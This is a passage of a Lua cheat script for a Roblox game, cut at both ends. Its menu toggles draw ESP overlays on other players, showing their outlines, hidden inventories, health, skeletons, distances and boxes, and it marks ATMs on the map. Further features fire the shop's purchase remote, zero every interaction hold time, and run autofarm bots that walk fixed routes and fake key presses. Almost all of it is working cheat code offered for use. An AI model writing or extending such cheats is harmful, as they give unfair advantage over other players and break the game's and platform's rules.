    highlight.FillTransparency = 0.2
    highlight.OutlineColor = Color3.new(1, 1, 1)
    highlight.OutlineTransparency = 0
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Adornee = player.Character
    highlight.Parent = player.Character
    highlights[player] = highlight
end

local function RemoveHighlight(player)
    if highlights[player] then
        highlights[player]:Destroy()
        highlights[player] = nil
    end
end

local function EnableHighlightESP()
    for _, player in pairs(Players:GetPlayers()) do
        CreateHighlight(player)
    end
end

local function DisableHighlightESP()
    for player, _ in pairs(highlights) do
        RemoveHighlight(player)
    end
end

local function ToggleHighlightESP(state)
    highlightESPEnabled = state
    if highlightESPEnabled then
        EnableHighlightESP()
    else
        DisableHighlightESP()
    end
end

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        if highlightESPEnabled then
            CreateHighlight(player)
        end
    end)
end)
Players.PlayerRemoving:Connect(RemoveHighlight)

RunService.RenderStepped:Connect(function()
    if highlightESPEnabled then
        local color = highlightRainbow and getRainbowColor(tick()) or highlightColor
        for _, highlight in pairs(highlights) do
            highlight.FillColor = color
        end
    end
end)

VisualsGroup:AddToggle('HighlightESP', {
    Text = 'Highlight ESP (Rainbow)',
    Default = false,
    Callback = ToggleHighlightESP,
})

-- === Inventory ESP ===
local inventoryESPGUIs = {}
local excludedItems = { 'Phone', 'Fist', 'Large Marshmallow Bag' } -- Add more as needed

local function isExcluded(itemName)
    for _, excluded in ipairs(excludedItems) do
        if itemName == excluded then return true end
    end
    return false
end

local function displayInventory(player)
    if not player.Character then return end
    local head = player.Character:FindFirstChild('Head')
    if not head then return end
    if inventoryESPGUIs[player] then
        inventoryESPGUIs[player]:Destroy()
        inventoryESPGUIs[player] = nil
    end
    local billboardGui = Instance.new('BillboardGui')
    billboardGui.Name = 'InventoryESP'
    billboardGui.Adornee = head
    billboardGui.Size = UDim2.new(0, 250, 0, 80)
    billboardGui.StudsOffset = Vector3.new(0, 6, 0)
    billboardGui.AlwaysOnTop = true
    local textLabel = Instance.new('TextLabel', billboardGui)
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.TextColor3 = Color3.new(1, 1, 1)
    textLabel.BackgroundTransparency = 1
    textLabel.TextSize = 32
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextWrapped = true
    local function updateInventory()
        local inventoryText = ''
        local displayedItems = {}
        if player.Backpack then
            for _, item in pairs(player.Backpack:GetChildren()) do
                if not isExcluded(item.Name) and not displayedItems[item.Name] then
                    inventoryText = item.Name .. '\n' .. inventoryText
                    displayedItems[item.Name] = true
                end
            end
        end
        local character = player.Character
        if character then
            for _, item in pairs(character:GetChildren()) do
                if item:IsA('Tool') and not isExcluded(item.Name) and not displayedItems[item.Name] then
                    inventoryText = item.Name .. ' -Hand\n' .. inventoryText
                    displayedItems[item.Name] = true
                end
            end
        end
        textLabel.Text = inventoryText
    end
    if player.Backpack then
        player.Backpack.ChildAdded:Connect(updateInventory)
        player.Backpack.ChildRemoved:Connect(updateInventory)
    end
    if player.Character then
        player.Character.ChildAdded:Connect(updateInventory)
        player.Character.ChildRemoved:Connect(updateInventory)
    end
    updateInventory()
    billboardGui.Parent = head
    inventoryESPGUIs[player] = billboardGui
end

local function removeInventoryESP(player)
    if inventoryESPGUIs[player] then
        inventoryESPGUIs[player]:Destroy()
        inventoryESPGUIs[player] = nil
    end
end

local function enableInventoryESP()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            displayInventory(player)
            player.CharacterAdded:Connect(function()
                displayInventory(player)
            end)
        end
    end
end

local function disableInventoryESP()
    for _, player in pairs(Players:GetPlayers()) do
        removeInventoryESP(player)
    end
end

VisualsGroup:AddToggle('InventoryESP', {
    Text = 'Inventory ESP',
    Default = false,
    Callback = function(state)
        if state then
            enableInventoryESP()
        else
            disableInventoryESP()
        end
    end,
})

-- === ATM ESP ===
local atmEspEnabled = false
local atmConnections = {}
local function toggleESPForATM(state)
    local ATMFolder = workspace:FindFirstChild('Map') and workspace.Map:FindFirstChild('ATMS')
    if not ATMFolder then return end
    if state then
        for _, object in ipairs(ATMFolder:GetChildren()) do
            if object:IsA('BasePart') and not object:FindFirstChild('BillboardGui') then
                local BillboardGui = Instance.new('BillboardGui')
                local TextLabel = Instance.new('TextLabel')
                BillboardGui.Adornee = object
                BillboardGui.Size = UDim2.new(0, 50, 0, 25)
                BillboardGui.AlwaysOnTop = true
                TextLabel.Parent = BillboardGui
                TextLabel.Size = UDim2.new(1, 0, 1, 0)
                TextLabel.BackgroundTransparency = 1
                TextLabel.Text = 'ATM'
                TextLabel.TextColor3 = Color3.new(0, 1, 0)
                TextLabel.TextScaled = true
                BillboardGui.Parent = object
                table.insert(atmConnections, BillboardGui)
            end
        end
    else
        for _, gui in ipairs(atmConnections) do
            if gui.Parent then gui:Destroy() end
        end
        atmConnections = {}
    end
end

VisualsGroup:AddToggle('ATMEsp', {
    Text = 'ATM ESP',
    Default = false,
    Callback = function(state)
        atmEspEnabled = state
        toggleESPForATM(atmEspEnabled)
    end,
})

-- === Health Bar ESP ===
local healthBarEnabled = false
local healthBarConnections = {}
local healthBarDrawings = {}

local function NewLine(thickness, color)
    local line = Drawing.new('Line')
    line.Visible = false
    line.From = Vector2.new(0, 0)
    line.To = Vector2.new(0, 0)
    line.Color = color
    line.Thickness = thickness
    line.Transparency = 1
    return line
end

local function HealthBar(plr)
    local library = {
        healthbar = NewLine(3, Color3.fromRGB(0, 0, 0)),
        greenhealth = NewLine(1.5, Color3.fromRGB(0, 255, 0)),
    }
    healthBarDrawings[plr] = library
    local connection
    connection = RunService.RenderStepped:Connect(function()
        if not healthBarEnabled then
            library.greenhealth.Visible = false
            library.healthbar.Visible = false
            if connection then connection:Disconnect() end
            return
        end
        if plr.Character and plr.Character:FindFirstChild('Humanoid') and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character.Humanoid.Health > 0 and plr.Character:FindFirstChild('Head') then
            local HumPos, OnScreen = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
            if OnScreen then
                local head = Camera:WorldToViewportPoint(plr.Character.Head.Position)
                local DistanceY = math.clamp((Vector2.new(head.X, head.Y) - Vector2.new(HumPos.X, HumPos.Y)).magnitude, 2, math.huge)
                local d = (Vector2.new(HumPos.X - DistanceY, HumPos.Y - DistanceY * 2) - Vector2.new(HumPos.X - DistanceY, HumPos.Y + DistanceY * 2)).magnitude
                local healthoffset = plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth * d
                library.greenhealth.From = Vector2.new(HumPos.X - DistanceY - 4, HumPos.Y + DistanceY * 2)
                library.greenhealth.To = Vector2.new(HumPos.X - DistanceY - 4, HumPos.Y + DistanceY * 2 - healthoffset)
                library.healthbar.From = Vector2.new(HumPos.X - DistanceY - 4, HumPos.Y + DistanceY * 2)
                library.healthbar.To = Vector2.new(HumPos.X - DistanceY - 4, HumPos.Y - DistanceY * 2)
                local green = Color3.fromRGB(0, 255, 0)
                local red = Color3.fromRGB(255, 0, 0)
                library.greenhealth.Color = red:lerp(green, plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth)
                library.greenhealth.Visible = true
                library.healthbar.Visible = true
            else
                library.greenhealth.Visible = false
                library.healthbar.Visible = false
            end
        else
            library.greenhealth.Visible = false
            library.healthbar.Visible = false
        end
    end)
    table.insert(healthBarConnections, connection)
end

local function enableHealthBars()
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer then
            HealthBar(v)
        end
    end
    healthBarConnections.playerAdded = Players.PlayerAdded:Connect(function(newplr)
        if newplr ~= LocalPlayer then
            HealthBar(newplr)
        end
    end)
end

local function disableHealthBars()
    for _, conn in ipairs(healthBarConnections) do
        if typeof(conn) == 'RBXScriptConnection' then
            conn:Disconnect()
        end
    end
    if healthBarConnections.playerAdded then
        healthBarConnections.playerAdded:Disconnect()
        healthBarConnections.playerAdded = nil
    end
    healthBarConnections = {}
    for _, library in pairs(healthBarDrawings) do
        if library.healthbar then library.healthbar.Visible = false library.healthbar:Remove() end
        if library.greenhealth then library.greenhealth.Visible = false library.greenhealth:Remove() end
    end
    healthBarDrawings = {}
end

VisualsGroup:AddToggle('HealthBarESP', {
    Text = 'Health Bar ESP',
    Default = false,
    Callback = function(state)
        healthBarEnabled = state
        if state then
            enableHealthBars()
        else
            disableHealthBars()
        end
    end,
})

-- === Tracers ===
local tracerConnections = {}
local tracerDrawings = {}
local tracersEnabled = false

local function TracerESP(plr)
    local tracer = NewLine(1, Color3.fromRGB(255, 250, 250))
    tracerDrawings[plr] = tracer
    local connection
    connection = RunService.RenderStepped:Connect(function()
        if not tracersEnabled then
            tracer.Visible = false
            return
        end
        if plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') then
            local HumPos, OnScreen = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
            if OnScreen then
                tracer.From = Vector2.new(Camera.ViewportSize.X * 0.5, Camera.ViewportSize.Y)
                tracer.To = Vector2.new(HumPos.X, HumPos.Y)
                tracer.Visible = true
            else
                tracer.Visible = false
            end
        else
            tracer.Visible = false
            if not Players:FindFirstChild(plr.Name) then
                connection:Disconnect()
            end
        end
    end)
    table.insert(tracerConnections, connection)
end

local function enableTracers()
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer then
            TracerESP(v)
        end
    end
    tracerConnections.playerAdded = Players.PlayerAdded:Connect(function(newplr)
        if newplr ~= LocalPlayer then
            TracerESP(newplr)
        end
    end)
end

local function disableTracers()
    for _, conn in ipairs(tracerConnections) do
        if typeof(conn) == 'RBXScriptConnection' then
            conn:Disconnect()
        end
    end
    if tracerConnections.playerAdded then
        tracerConnections.playerAdded:Disconnect()
        tracerConnections.playerAdded = nil
    end
    tracerConnections = {}
    for _, tracer in pairs(tracerDrawings) do
        if tracer then tracer.Visible = false tracer:Remove() end
    end
    tracerDrawings = {}
end

VisualsGroup:AddToggle('TracersESP', {
    Text = 'Tracers',
    Default = false,
    Callback = function(state)
        tracersEnabled = state
        if state then
            enableTracers()
        else
            disableTracers()
        end
    end,
})

-- === Skeleton ESP ===
local skeletonESPEnabled = false
local skeletonConnections = {}
local skeletonDrawings = {}

local function DrawLine()
    local l = Drawing.new('Line')
    l.Visible = false
    l.From = Vector2.new(0, 0)
    l.To = Vector2.new(1, 1)
    l.Color = Color3.fromRGB(255, 250, 250)
    l.Thickness = 1
    l.Transparency = 1
    return l
end

local function DrawESP(plr)
    repeat task.wait() until plr.Character and plr.Character:FindFirstChild('Humanoid')
    local limbs = {}
    local R15 = (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15)
    if R15 then
        limbs = {
            Head_UpperTorso = DrawLine(),
            UpperTorso_LowerTorso = DrawLine(),
            UpperTorso_LeftUpperArm = DrawLine(),
            LeftUpperArm_LeftLowerArm = DrawLine(),
            LeftLowerArm_LeftHand = DrawLine(),
            UpperTorso_RightUpperArm = DrawLine(),
            RightUpperArm_RightLowerArm = DrawLine(),
            RightLowerArm_RightHand = DrawLine(),
            LowerTorso_LeftUpperLeg = DrawLine(),
            LeftUpperLeg_LeftLowerLeg = DrawLine(),
            LeftLowerLeg_LeftFoot = DrawLine(),
            LowerTorso_RightUpperLeg = DrawLine(),
            RightUpperLeg_RightLowerLeg = DrawLine(),
            RightLowerLeg_RightFoot = DrawLine(),
        }
    else
        limbs = {
            Head_Spine = DrawLine(),
            Spine = DrawLine(),
            LeftArm = DrawLine(),
            LeftArm_UpperTorso = DrawLine(),
            RightArm = DrawLine(),
            RightArm_UpperTorso = DrawLine(),
            LeftLeg = DrawLine(),
            LeftLeg_LowerTorso = DrawLine(),
            RightLeg = DrawLine(),
            RightLeg_LowerTorso = DrawLine(),
        }
    end
    skeletonDrawings[plr] = limbs
    local function Visibility(state)
        for _, v in pairs(limbs) do
            v.Visible = state
        end
    end
    local function UpdaterR15()
        local connection
        connection = RunService.RenderStepped:Connect(function()
            if not skeletonESPEnabled then
                Visibility(false)
                return
            end
            if plr.Character and plr.Character:FindFirstChild('Humanoid') and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character.Humanoid.Health > 0 then
                local HUM, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
                if vis then
                    local H = Camera:WorldToViewportPoint(plr.Character.Head.Position)
                    local UT = Camera:WorldToViewportPoint(plr.Character.UpperTorso.Position)
                    local LT = Camera:WorldToViewportPoint(plr.Character.LowerTorso.Position)
                    local LUA = Camera:WorldToViewportPoint(plr.Character.LeftUpperArm.Position)
                    local LLA = Camera:WorldToViewportPoint(plr.Character.LeftLowerArm.Position)
                    local LH = Camera:WorldToViewportPoint(plr.Character.LeftHand.Position)
                    local RUA = Camera:WorldToViewportPoint(plr.Character.RightUpperArm.Position)
                    local RLA = Camera:WorldToViewportPoint(plr.Character.RightLowerArm.Position)
                    local RH = Camera:WorldToViewportPoint(plr.Character.RightHand.Position)
                    local LUL = Camera:WorldToViewportPoint(plr.Character.LeftUpperLeg.Position)
                    local LLL = Camera:WorldToViewportPoint(plr.Character.LeftLowerLeg.Position)
                    local LF = Camera:WorldToViewportPoint(plr.Character.LeftFoot.Position)
                    local RUL = Camera:WorldToViewportPoint(plr.Character.RightUpperLeg.Position)
                    local RLL = Camera:WorldToViewportPoint(plr.Character.RightLowerLeg.Position)
                    local RF = Camera:WorldToViewportPoint(plr.Character.RightFoot.Position)
                    limbs.Head_UpperTorso.From = Vector2.new(H.X, H.Y)
                    limbs.Head_UpperTorso.To = Vector2.new(UT.X, UT.Y)
                    limbs.UpperTorso_LowerTorso.From = Vector2.new(UT.X, UT.Y)
                    limbs.UpperTorso_LowerTorso.To = Vector2.new(LT.X, LT.Y)
                    limbs.UpperTorso_LeftUpperArm.From = Vector2.new(UT.X, UT.Y)
                    limbs.UpperTorso_LeftUpperArm.To = Vector2.new(LUA.X, LUA.Y)
                    limbs.LeftUpperArm_LeftLowerArm.From = Vector2.new(LUA.X, LUA.Y)
                    limbs.LeftUpperArm_LeftLowerArm.To = Vector2.new(LLA.X, LLA.Y)
                    limbs.LeftLowerArm_LeftHand.From = Vector2.new(LLA.X, LLA.Y)
                    limbs.LeftLowerArm_LeftHand.To = Vector2.new(LH.X, LH.Y)
                    limbs.UpperTorso_RightUpperArm.From = Vector2.new(UT.X, UT.Y)
                    limbs.UpperTorso_RightUpperArm.To = Vector2.new(RUA.X, RUA.Y)
                    limbs.RightUpperArm_RightLowerArm.From = Vector2.new(RUA.X, RUA.Y)
                    limbs.RightUpperArm_RightLowerArm.To = Vector2.new(RLA.X, RLA.Y)
                    limbs.RightLowerArm_RightHand.From = Vector2.new(RLA.X, RLA.Y)
                    limbs.RightLowerArm_RightHand.To = Vector2.new(RH.X, RH.Y)
                    limbs.LowerTorso_LeftUpperLeg.From = Vector2.new(LT.X, LT.Y)
                    limbs.LowerTorso_LeftUpperLeg.To = Vector2.new(LUL.X, LUL.Y)
                    limbs.LeftUpperLeg_LeftLowerLeg.From = Vector2.new(LUL.X, LUL.Y)
                    limbs.LeftUpperLeg_LeftLowerLeg.To = Vector2.new(LLL.X, LLL.Y)
                    limbs.LeftLowerLeg_LeftFoot.From = Vector2.new(LLL.X, LLL.Y)
                    limbs.LeftLowerLeg_LeftFoot.To = Vector2.new(LF.X, LF.Y)
                    limbs.LowerTorso_RightUpperLeg.From = Vector2.new(LT.X, LT.Y)
                    limbs.LowerTorso_RightUpperLeg.To = Vector2.new(RUL.X, RUL.Y)
                    limbs.RightUpperLeg_RightLowerLeg.From = Vector2.new(RUL.X, RUL.Y)
                    limbs.RightUpperLeg_RightLowerLeg.To = Vector2.new(RLL.X, RLL.Y)
                    limbs.RightLowerLeg_RightFoot.From = Vector2.new(RLL.X, RLL.Y)
                    limbs.RightLowerLeg_RightFoot.To = Vector2.new(RF.X, RF.Y)
                    Visibility(true)
                else
                    Visibility(false)
                end
            else
                Visibility(false)
                if not Players:FindFirstChild(plr.Name) then
                    for _, v in pairs(limbs) do v:Remove() end
                    if connection then connection:Disconnect() end
                end
            end
        end)
        table.insert(skeletonConnections, connection)
    end
    if R15 then
        coroutine.wrap(UpdaterR15)()
    end
end

local function enableSkeletonESP()
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer then
            DrawESP(v)
        end
    end
    skeletonConnections.playerAdded = Players.PlayerAdded:Connect(function(newplr)
        if newplr ~= LocalPlayer then
            DrawESP(newplr)
        end
    end)
end

local function disableSkeletonESP()
    for _, conn in ipairs(skeletonConnections) do
        if typeof(conn) == 'RBXScriptConnection' then
            conn:Disconnect()
        end
    end
    if skeletonConnections.playerAdded then
        skeletonConnections.playerAdded:Disconnect()
        skeletonConnections.playerAdded = nil
    end
    skeletonConnections = {}
    for _, limbs in pairs(skeletonDrawings) do
        for _, line in pairs(limbs) do
            line.Visible = false
            line:Remove()
        end
    end
    skeletonDrawings = {}
end

VisualsGroup:AddToggle('SkeletonESP', {
    Text = 'Skeleton ESP',
    Default = false,
    Callback = function(state)
        skeletonESPEnabled = state
        if state then
            enableSkeletonESP()
        else
            disableSkeletonESP()
        end
    end,
})

-- === Distance ESP ===
local distanceESPEnabled = false
local distanceESPDrawings = {}
local distanceESPConnections = {}

local function enableDistanceESP()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local drawing = Drawing.new('Text')
            drawing.Visible = false
            drawing.Center = true
            drawing.Outline = false
            drawing.Font = 3
            drawing.Size = 11
            drawing.Color = Color3.new(1, 1, 1)
            distanceESPDrawings[player] = drawing
            local conn = RunService.RenderStepped:Connect(function()
                if not distanceESPEnabled then
                    drawing.Visible = false
                    return
                end
                if player.Character and player.Character:FindFirstChild('HumanoidRootPart') then
                    local pos, onScreen = Camera:WorldToViewportPoint(player.Character.HumanoidRootPart.Position)
                    if onScreen then
                        local dist = (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart'))
                            and (LocalPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude or 0
                        drawing.Position = Vector2.new(pos.X, pos.Y + 39)
                        drawing.Text = string.format('%.1f', dist)
                        drawing.Visible = true
                    else
                        drawing.Visible = false
                    end
                else
                    drawing.Visible = false
                end
            end)
            table.insert(distanceESPConnections, conn)
        end
    end
end

local function disableDistanceESP()
    for _, conn in ipairs(distanceESPConnections) do
        if typeof(conn) == 'RBXScriptConnection' then
            conn:Disconnect()
        end
    end
    distanceESPConnections = {}
    for _, drawing in pairs(distanceESPDrawings) do
        if drawing then drawing.Visible = false drawing:Remove() end
    end
    distanceESPDrawings = {}
end

VisualsGroup:AddToggle('DistanceESP', {
    Text = 'Distance ESP',
    Default = false,
    Callback = function(state)
        distanceESPEnabled = state
        if state then
            enableDistanceESP()
        else
            disableDistanceESP()
        end
    end,
})

-- === Box ESP ===
local boxESPEnabled = false
local boxESPConnections = {}
local boxESPLibraries = {}

local function NewBoxLine(color, thickness)
    local line = Drawing.new('Line')
    line.Visible = false
    line.From = Vector2.new(0, 0)
    line.To = Vector2.new(0, 0)
    line.Color = color
    line.Thickness = thickness
    line.Transparency = 1
    return line
end

local function BoxESP(plr)
    repeat task.wait() until plr.Character and plr.Character:FindFirstChild('Humanoid')
    local Library = {
        TL1 = NewBoxLine(Color3.fromRGB(255, 250, 250), 2),
        TL2 = NewBoxLine(Color3.fromRGB(255, 250, 250), 2),
        TR1 = NewBoxLine(Color3.fromRGB(255, 250, 250), 2),
        TR2 = NewBoxLine(Color3.fromRGB(255, 250, 250), 2),
        BL1 = NewBoxLine(Color3.fromRGB(255, 250, 250), 2),
        BL2 = NewBoxLine(Color3.fromRGB(255, 250, 250), 2),
        BR1 = NewBoxLine(Color3.fromRGB(255, 250, 250), 2),
        BR2 = NewBoxLine(Color3.fromRGB(255, 250, 250), 2),
    }
    boxESPLibraries[plr] = Library
    local oripart = Instance.new('Part')
    oripart.Parent = workspace
    oripart.Transparency = 1
    oripart.CanCollide = false
    oripart.Size = Vector3.new(1, 1, 1)
    oripart.Position = Vector3.new(0, 0, 0)
    local function Vis(lib, state)
        for _, v in pairs(lib) do v.Visible = state end
    end
    local connection
    connection = RunService.RenderStepped:Connect(function()
        if not boxESPEnabled then
            Vis(Library, false)
            return
        end
        if plr.Character and plr.Character:FindFirstChild('Humanoid') and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character.Humanoid.Health > 0 and plr.Character:FindFirstChild('Head') then
            local Hum = plr.Character
            local HumPos, vis = Camera:WorldToViewportPoint(Hum.HumanoidRootPart.Position)
            if vis then
                oripart.Size = Vector3.new(Hum.HumanoidRootPart.Size.X, Hum.HumanoidRootPart.Size.Y * 1.5, Hum.HumanoidRootPart.Size.Z)
                oripart.CFrame = CFrame.new(Hum.HumanoidRootPart.CFrame.Position, Camera.CFrame.Position)
                local SizeX = oripart.Size.X
                local SizeY = oripart.Size.Y
                local TL = Camera:WorldToViewportPoint((oripart.CFrame * CFrame.new(SizeX, SizeY, 0)).p)
                local TR = Camera:WorldToViewportPoint((oripart.CFrame * CFrame.new(-SizeX, SizeY, 0)).p)
                local BL = Camera:WorldToViewportPoint((oripart.CFrame * CFrame.new(SizeX, -SizeY, 0)).p)
                local BR = Camera:WorldToViewportPoint((oripart.CFrame * CFrame.new(-SizeX, -SizeY, 0)).p)
                Library.TL1.From = Vector2.new(TL.X, TL.Y)
                Library.TL1.To = Vector2.new(TL.X + 10, TL.Y)
                Library.TL2.From = Vector2.new(TL.X, TL.Y)
                Library.TL2.To = Vector2.new(TL.X, TL.Y + 10)
                Library.TR1.From = Vector2.new(TR.X, TR.Y)
                Library.TR1.To = Vector2.new(TR.X - 10, TR.Y)
                Library.TR2.From = Vector2.new(TR.X, TR.Y)
                Library.TR2.To = Vector2.new(TR.X, TR.Y + 10)
                Library.BL1.From = Vector2.new(BL.X, BL.Y)
                Library.BL1.To = Vector2.new(BL.X + 10, BL.Y)
                Library.BL2.From = Vector2.new(BL.X, BL.Y)
                Library.BL2.To = Vector2.new(BL.X, BL.Y - 10)
                Library.BR1.From = Vector2.new(BR.X, BR.Y)
                Library.BR1.To = Vector2.new(BR.X - 10, BR.Y)
                Library.BR2.From = Vector2.new(BR.X, BR.Y)
                Library.BR2.To = Vector2.new(BR.X, BR.Y - 10)
                Vis(Library, true)
            else
                Vis(Library, false)
            end
        else
            Vis(Library, false)
            if not Players:FindFirstChild(plr.Name) then
                for _, v in pairs(Library) do v:Remove() oripart:Destroy() end
                if connection then connection:Disconnect() end
            end
        end
    end)
    table.insert(boxESPConnections, connection)
end

local function enableBoxESP()
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer then
            BoxESP(v)
        end
    end
    boxESPConnections.playerAdded = Players.PlayerAdded:Connect(function(newplr)
        if newplr ~= LocalPlayer then
            BoxESP(newplr)
        end
    end)
end

local function disableBoxESP()
    for _, conn in ipairs(boxESPConnections) do
        if typeof(conn) == 'RBXScriptConnection' then
            conn:Disconnect()
        end
    end
    if boxESPConnections.playerAdded then
        boxESPConnections.playerAdded:Disconnect()
        boxESPConnections.playerAdded = nil
    end
    boxESPConnections = {}
    for _, libs in pairs(boxESPLibraries) do
        for _, v in pairs(libs) do
            if v.Remove then v:Remove() end
        end
    end
    boxESPLibraries = {}
end

VisualsGroup:AddToggle('Corner BoxESP', {
    Text = 'Corner Box ESP',
    Default = false,
    Callback = function(state)
        boxESPEnabled = state
        if state then
            enableBoxESP()
        else
            disableBoxESP()
        end
    end,
})


local shopItems = {
    "Potato ($73)",
    "Flour ($80)",
    "Water ($15)",
    "Bandana ($70)",
    "Bloxy Cola ($30)",
    "Surgical Mask ($60)",
    "Medical Gloves ($30)",
    "Black Gloves ($30)",
    "White Gloves ($30)",
    "White Ski Mask ($55)",
    "Sugar Block Bag ($100)",
    "Gelatin ($70)",
}

-- Map display names to item names for purchase
local itemNameMap = {
    ["Potato ($73)"] = "Potato",
    ["Flour ($80)"] = "Flour",
    ["Water ($15)"] = "Water",
    ["Bandana ($70)"] = "Bandana",
    ["Bloxy Cola ($30)"] = "Bloxy Cola",
    ["Surgical Mask ($60)"] = "Surgical Mask",
    ["Medical Gloves ($30)"] = "Medical Gloves",
    ["Black Gloves ($30)"] = "Black Gloves",
    ["White Gloves ($30)"] = "White Gloves",
    ["White Ski Mask ($55)"] = "White Ski Mask",
    ["Sugar Block Bag ($100)"] = "Sugar Block Bag",
    ["Gelatin ($70)"] = "Gelatin",
}

local function purchaseItem(itemName)
    local args = { itemName }
    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("StorePurchase"):FireServer(unpack(args))
    print("Purchased: " .. itemName)
end

ShopGroup:AddDropdown('ShopDropdown', {
    Text = 'Select Item to Purchase',
    Values = shopItems,
    Default = shopItems[1],
    Multi = false,
    Callback = function(selected)
        if selected and itemNameMap[selected] then
            purchaseItem(itemNameMap[selected])
        end
    end
})


local boxAutofarmRunning = false
AutofarmGroup:AddToggle('BoxAutofarm', {
    Text = "Box Autofarm",
    Default = false,
    Callback = function(state)
        boxAutofarmRunning = state
        if not state then return end

        task.spawn(function()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")
            local virtualInputManager = game:GetService("VirtualInputManager")
            local userInputService = game:GetService("UserInputService")
            local backpack = player.Backpack 
            
            local konum1 = Vector3.new(-551.46, 3.54, -86.13)
            local konum2 = Vector3.new(-540.16, 3.54, -83.06)
            local konum3 = Vector3.new(-401.42, 3.36, -70.90)
            
            local function pressE()
                virtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
            end
            
            local function releaseE()
                virtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
            end
            
            local function moveToPosition(position)
                humanoid.WalkSpeed = 15 
                humanoid:MoveTo(position)
                while boxAutofarmRunning and (character.HumanoidRootPart.Position - position).Magnitude > 1 do
                    task.wait()
                    if humanoid.MoveToFinished then
                        humanoid:MoveTo(position)
                    end
                end
                humanoid.WalkSpeed = 16 
            end
            
            local function getCrateFromBackpack()
                for _, item in ipairs(backpack:GetChildren()) do
                    if item.Name == "Crate" then 
                        return item
                    end
                end
                return nil
            end
            
            local function equipCrate(crate)
                if crate then
                    crate.Parent = character
                    crate.Handle.CFrame = character:WaitForChild("RightHand").CFrame 
                end
            end
            
            local function performAction()
                if not boxAutofarmRunning then return end
                moveToPosition(konum1)
                if not boxAutofarmRunning then return end
                pressE()
                releaseE()
                if not boxAutofarmRunning then return end
                moveToPosition(konum2)
                if not boxAutofarmRunning then return end
                moveToPosition(konum3)
                if not boxAutofarmRunning then return end
                local crate = getCrateFromBackpack()
                if not boxAutofarmRunning then return end
                equipCrate(crate)
                if not boxAutofarmRunning then return end
                pressE()
                releaseE()
                if not boxAutofarmRunning then return end
                moveToPosition(konum2)
                if not boxAutofarmRunning then return end
                moveToPosition(konum1)
            end

            local inputConn
            inputConn = userInputService.InputBegan:Connect(function(input, gameProcessed)
                if gameProcessed then return end
                if input.KeyCode == Enum.KeyCode.P then
                    boxAutofarmRunning = false
                    humanoid:MoveTo(character.HumanoidRootPart.Position)
                    if inputConn then inputConn:Disconnect() end
                end
            end)

            while boxAutofarmRunning do
                performAction()
                task.wait(1)
            end
        end)
    end
})


-- Add a button for Chips Autofarm in the Autofarm groupbox using LinoriaLib

AutofarmGroup:AddToggle('ChipsAutofarm', {
    Text = "Chips Autofarm (P to stop)",
    Default = false,
    Tooltip = "Automatically farms chips. Press P to stop.",
    Callback = function(state)
        local chipsAutofarmRunning = state
        if not state then return end

        task.spawn(function()
            local positions = {
                {pos = Vector3.new(-461.62, 3.86, -467.55), tool = "Potato", holdE = true, holdTime = 0, waitTime = 2},
                {pos = Vector3.new(-461.6, 3.86, -473.63), holdE = true, holdTime = 0, waitTime = 2},
                {pos = Vector3.new(-466.43, 3.96, -500.60)},
                {pos = Vector3.new(-462.67, 3.86, -522.34), tool = "Flour", holdE = true, holdTime = 0, waitTime = 2},
                {pos = Vector3.new(-468.11, 3.86, -494.76)},
                {pos = Vector3.new(-515.34, 3.86, -482.29), holdE = true, holdTime = 0, waitTime = 65, reholdE = true, reholdTime = 0},
                {pos = Vector3.new(-492, 4, -473)}, 
                {pos = Vector3.new(-480, 4, -434), holdE = true, holdTime = 0}
            }

            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")
            humanoid.WalkSpeed = 19

            local function moveTo(position)
                humanoid:MoveTo(position)
                humanoid.MoveToFinished:Wait()
            end

            local function performAction(action)
                if action.tool then
                    local tool = player.Backpack:FindFirstChild(action.tool)
                    if tool then
                        tool.Parent = character
                    end
                end

                if action.holdE then
                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.E, false, game)
                    wait(action.holdTime)
                    game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.E, false, game)
                end

                if action.waitTime then
                    wait(action.waitTime)
                end
            end

            local inputConn
            inputConn = game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
                if gameProcessed then return end
                if input.KeyCode == Enum.KeyCode.P then
                    chipsAutofarmRunning = false
                    if inputConn then inputConn:Disconnect() end
                end
            end)

            for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                if v:IsA("ProximityPrompt") then
                    v.HoldDuration = 0
                end
            end

            game:GetService("ProximityPromptService").PromptButtonHoldBegan:Connect(function(v)
                v.HoldDuration = 0
            end)

            while chipsAutofarmRunning do
                for _, action in ipairs(positions) do
                    if not chipsAutofarmRunning then break end
                    moveTo(action.pos)
                    performAction(action)
                    if action.reholdE then
                        performAction({holdE = true, holdTime = action.reholdTime})
                    end
                end
